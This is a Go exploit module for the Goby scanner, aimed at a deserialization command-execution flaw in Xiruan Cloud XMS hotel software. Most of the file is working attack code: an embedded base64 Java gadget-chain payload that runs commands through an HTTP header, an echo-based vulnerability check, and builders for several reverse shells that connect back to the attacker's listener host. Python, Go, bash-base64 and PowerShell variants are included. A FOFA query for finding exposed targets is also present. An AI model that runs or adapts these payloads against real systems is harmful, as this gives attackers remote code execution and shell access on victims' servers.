package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Xiruan Cloud XMS /fox-invoker/FoxLookupInvoker/?return-exception=true Deserialization Command Execution Vulnerability",
    "Description": "<p>Xiruanyun XMS is a hotel management system developed based on the cloud platform data center that supports multiple hotels, multiple languages, and multiple platforms. </p><p> Xiruanyun XMS /fox-invoker/FoxLookupInvoker/?return-exception=true interface has a deserialization vulnerability, and attackers can execute arbitrary commands by constructing serialized content.</p>",
    "Product": "shiji-Westsoft-Cloud-XMS",
    "Homepage": "https://www.foxhis.com/",
    "DisclosureDate": "2024-07-08",
    "PostTime": "2024-07-11",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "(body=\"href=\\\"xmsenv.exe\\\">系统运行环境\" || title=\"西软云XMS\") && title=\"西软云XMS\"",
    "GobyQuery": "(body=\"href=\\\"xmsenv.exe\\\">系统运行环境\" || title=\"西软云XMS\") && title=\"西软云XMS\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization vulnerability in the /fox-invoker/FoxLookupInvoker/?return-exception=true interface of Xiruan Cloud XMS. An attacker can execute arbitrary commands, write backdoors, obtain server permissions, and control the entire web server by constructing serialized content.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to obtain the latest security version or patch. </p><p>2. Perform permission check on the interface. </p><p>3. Use WAF to filter and intercept abnormal requests.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.7",
    "Translation": {
        "CN": {
            "Name": "西软云XMS /fox-invoker/FoxLookupInvoker/?return-exception=true 反序列化命令执行漏洞",
            "Product": "shiji-西软云XMS",
            "Description": "<p>西软云XMS是基于云平台数据中心开发的支持多酒店、多语言、多平台的酒店管理系统。<br></p><p>西软云XMS /fox-invoker/FoxLookupInvoker/?return-exception=true 接口存在反序列化漏洞，攻击者通过构造序列化内容可以实现任意命令执行。<br></p>",
            "Recommendation": "<p>1、联系厂商获取最新安全版本或者补丁。</p><p>2、对接口进行权限校验。</p><p>3、使用waf，过滤和拦截不正常的请求。</p>",
            "Impact": "<p>西软云XMS /fox-invoker/FoxLookupInvoker/?return-exception=true 接口存在反序列化漏洞，攻击者通过构造序列化内容可以实现任意命令执行，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Xiruan Cloud XMS /fox-invoker/FoxLookupInvoker/?return-exception=true Deserialization Command Execution Vulnerability",
            "Product": "shiji-Westsoft-Cloud-XMS",
            "Description": "<p>Xiruanyun XMS is a hotel management system developed based on the cloud platform data center that supports multiple hotels, multiple languages, and multiple platforms.&nbsp;</p><p>&nbsp;Xiruanyun XMS /fox-invoker/FoxLookupInvoker/?return-exception=true interface has a deserialization vulnerability, and attackers can execute arbitrary commands by constructing serialized content.</p>",
            "Recommendation": "<p>1. Contact the manufacturer to obtain the latest security version or patch.&nbsp;</p><p>2. Perform permission check on the interface.&nbsp;</p><p>3. Use WAF to filter and intercept abnormal requests.</p>",
            "Impact": "<p>There is a deserialization vulnerability in the /fox-invoker/FoxLookupInvoker/?return-exception=true interface of Xiruan Cloud XMS. An attacker can execute arbitrary commands, write backdoors, obtain server permissions, and control the entire web server by constructing serialized content.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10969"
}`

	setPayloadRequestHash_NZr3AS2qmh21uDRk := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		//漏洞url地址
		url := "/fox-invoker/FoxLookupInvoker/?return-exception=true"
		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk",
			"cmd":        command,
		}

		payload := "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAFK/K/rq+AAAAMwEFCgBFAIkKAIoAiwoAigCMCgAdAI0IAHoKABsAjgoAjwCQCgCPAJEHAHsKAIoAkggAkwoAIACUCACVCACWBwCXCACYCABYBwCZCgAbAJoIAJsIAHAHAJwLABYAnQsAFgCeCABnCACfBwCgCgAbAKEHAKIKAKMApAgApQcApggApwoAIACoCACpCQAlAKoHAKsKACUArAgArQoArgCvCgAgALAIALEIALIIALMIALQIALUHALYHALcKADAAuAoAMAC5CgC6ALsKAC8AvAgAvQoALwC+CgAvAL8KACAAwAgAwQoAGwDCCgAbAMMIAMQHAGQKABsAxQgAxgcAxwgAyAgAyQcAygcBAwcAzAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvVG9tY2F0Q21kRWNobzsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAzQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAANjbHMBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjUBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAltCAQAJcHJvY2Vzc29yAQASTGphdmEvbGFuZy9PYmplY3Q7AQADcmVxAQAEcmVzcAEAAWoBAAFJAQABdAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAA3N0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA29iagEACnByb2Nlc3NvcnMBABBMamF2YS91dGlsL0xpc3Q7AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABaQEABGZsYWcBAAFaAQAFZ3JvdXABABdMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsBAA1TdGFja01hcFRhYmxlBwDOBwDPBwDQBwCmBwCiBwCZBwCcBwBiBwDHBwDKAQAKU291cmNlRmlsZQEAElRvbWNhdENtZEVjaG8uamF2YQwARgBHBwDQDADRANIMANMA1AwA1QDWDADXANgHAM8MANkA2gwA2wDcDADdAN4BAARleGVjDADfAOABAARodHRwAQAGdGFyZ2V0AQASamF2YS9sYW5nL1J1bm5hYmxlAQAGdGhpcyQwAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDADhANYBAAZnbG9iYWwBAA5qYXZhL3V0aWwvTGlzdAwA4gDjDADbAOQBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwA5QDmAQAQamF2YS9sYW5nL09iamVjdAcA5wwA6ADpAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwA6gDrAQAJc2V0U3RhdHVzDADsAF4BABFqYXZhL2xhbmcvSW50ZWdlcgwARgDtAQAHb3MubmFtZQcA7gwA7wDwDADxAN4BAAN3aW4BAAdjbWQuZXhlAQACL2MBAAkvYmluL2Jhc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABGAPIMAPMA9AcA9QwA9gD3DABGAPgBAAJcQQwA+QD6DAD7AN4MAPwA/QEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwA/gD/DAEAAQEBAAhzZXRCeXRlcwwBAgDmAQAHZG9Xcml0ZQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAEAE2phdmEvbGFuZy9FeGNlcHRpb24BACp5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL1RvbWNhdENtZEVjaG8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEADWdldFN1cGVyY2xhc3MBAARzaXplAQADKClJAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2lzRW1wdHkBAAMoKVoBAARUWVBFAQAEKEkpVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9T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"

		data, _ := base64.StdEncoding.DecodeString(payload)
		resp, err := setPostRequest(hostInfo, url, string(data), header)
		if err != nil || resp.StatusCode != 200 {
			return "", "", err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_NZr3AS2qmh21uDRk

			//开头为数字，他就只会返回第一段数字部分
			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_NZr3AS2qmh21uDRk

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
